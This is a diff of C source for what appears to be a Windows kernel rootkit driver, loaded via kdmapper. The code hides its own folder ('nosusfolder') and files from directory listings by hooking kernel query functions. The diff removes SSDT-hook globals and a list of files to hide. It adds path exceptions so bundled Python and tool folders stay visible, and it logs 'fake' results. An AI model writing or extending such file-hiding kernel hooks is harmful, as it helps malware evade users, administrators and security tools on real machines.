@@ -3,35 +3,8 @@
 #include <wdm.h>
 
 
-// SSDT Hook global variables and definitions:
-typedef struct _SYSTEM_SERVICE_TABLE{
-    PVOID ServiceTableBase;
-    PVOID ServiceCounterTableBase;
-    ULONG64 NumberOfServices;
-    PVOID ParamTableBase;
-} SYSTEM_SERVICE_TABLE, * PSYSTEM_SERVICE_TABLE;
-
-PSYSTEM_SERVICE_TABLE KiServiceDescriptorTable = NULL;
-PVOID KernelImageBaseAddress = NULL;
-BYTE* KernelTextSection = NULL;
-ULONG TextSectionSize = 0;
-
-
-// Default memory pool "arrays" to hold original data of all hooks, will include this original data + jmp afterhookaddr (shellcode itself, in 1809 format):
-PVOID OriginalNtQueryDirFile = NULL;
-PVOID OriginalNtQueryDirFileEx = NULL;
-PVOID OriginalNtQuerySystemInformation = NULL;
-PVOID ActualNtQueryDirFile = NULL;
-PVOID ActualNtQueryDirFileEx = NULL;
-PVOID ActualNtQuerySystemInformation = NULL;
-
-
-const WCHAR* DefaultFileObjs[] = { L"nosusfolder", L"verysus", L"KMDFdriver", L"MainMedium",
-                                L"MainMedium.exe", L"KMDFdriver.sys", L"kdmapper.exe",
-                                L"MediumLogFile.txt", L"ServiceLog.txt", L"DriverDominance.txt" };
-const char* DefaultFileObjsReg[] = { "nosusfolder", "verysus", "KMDFdriver", "MainMedium",
-                                "MainMedium.exe", "KMDFdriver.sys", "kdmapper.exe",
-                                "MediumLogFile.txt", "ServiceLog.txt", "DriverDominance.txt" };
+const char* RootDirectory = "nosusfolder";
+const WCHAR* WideRootDirectory = L"nosusfolder";
 
 
 // Definitions of functions/types:
@@ -62,6 +35,13 @@ typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInfo
     OUT PVOID SystemInformation,
     IN ULONG SystemInformationLength,
     OUT PULONG ReturnLength OPTIONAL);
+
+
+typedef NTSTATUS(*QueryInformationByName)(IN POBJECT_ATTRIBUTES ObjectAttributes,
+    OUT PIO_STATUS_BLOCK IoStatusBlock,
+    OUT PVOID FileInformation,
+    IN ULONG Length,
+    IN FILE_INFORMATION_CLASS FileInformationClass);
 
 
 // Class for handling requested files to hide:
@@ -242,10 +222,10 @@ void SearchForInitialEvilDir(PUNICODE_STRING Name, BOOL* IsRoot, BOOL* IsSame, D
     USHORT DirIndex = 0;
 
     if (Checks >= 1) {
-        if (strlen("\\nosusfolder") * (sizeof(WCHAR) / sizeof(char)) <= Name->Length) {
+        if ((strlen(RootDirectory) + 1) * (sizeof(WCHAR) / sizeof(char)) <= Name->Length) {
             *IsRoot = FALSE;  // Only other case in which changed should be made, to hide nosusfolder in SystemRoot
-            for (DirIndex = 0; DirIndex < strlen("nosusfolder") && *IsSame; DirIndex++) {
-                if (DefaultFileObjs[0][DirIndex] != Name->Buffer[DirIndex + 1]) {
+            for (DirIndex = 0; DirIndex < strlen(RootDirectory) && *IsSame; DirIndex++) {
+                if (RootDirectory[DirIndex] != Name->Buffer[DirIndex + 1]) {
                     *IsSame = FALSE;
                 }
             }
@@ -367,7 +347,22 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
     PFILE_FULL_DIR_INFORMATION PreviousFull = { 0 };
     PFILE_FULL_DIR_INFORMATION CurrFull = { 0 };
     PVOID PreviousCurrent = NULL;  // Used to verify if while should end
+    const WCHAR* PythonPath = L"\\nosusfolder\\verysus\\MinPython";
+    const WCHAR* UtilitiesPath = L"\\nosusfolder\\verysus\\ExtraTools";
 
+
+    // Check if query includes python/extra tool files that should not be blocked:
+    if ((RtlCompareMemory(RequestedDir->Buffer, PythonPath, wcslen(PythonPath)) == wcslen(PythonPath) && 
+        wcslen(RequestedDir->Buffer) >= wcslen(PythonPath)) ||
+        (RtlCompareMemory(RequestedDir->Buffer, UtilitiesPath, wcslen(UtilitiesPath)) == wcslen(UtilitiesPath) &&
+        wcslen(RequestedDir->Buffer) >= wcslen(UtilitiesPath))) {
+        DbgPrintEx(0, 0, "\n\n-=-=-=-=-=FAKE LOG=-=-=-=-=-\n\n");
+        DbgPrintEx(0, 0, "KMDFdriver Hooking - Fake %wZ: %wZ, query path starts with ..\\ExtraTools / ..\\MinPython\n",
+            FunctionName, RequestedDir);
+        DbgPrintEx(0, 0, "\n-=-=-=-=-=FAKE ENDED=-=-=-=-=-\n\n");
+        return STATUS_SUCCESS;
+    }
+    
 
     // Cast parameters and call by type:
     switch (FileInfoClass) {
@@ -496,7 +491,7 @@ NTSTATUS IterateOverFiles(FILE_INFORMATION_CLASS FileInfoClass, PVOID FileInform
             CurrFull->FileIndex -= IndexDecr;
             CurrentFile.Buffer = CurrFull->FileName;
             CurrentFile.Length = (USHORT)CurrFull->FileNameLength;
-            CurrentFile.MaximumLength = (USHORT)CurrFull->FileNameLength;  
+            CurrentFile.MaximumLength = (USHORT)CurrFull->FileNameLength;
             if (*IsDirSame || general_helpers::CompareUnicodeStringsADD(&CurrentFile, SusFolder, 0) && *IsSystemRoot || IsToHideRequest(RequestedDir, &CurrentFile)) {
                 if (CurrFull->NextEntryOffset == 0) {
                     if (FileCount == 0) {
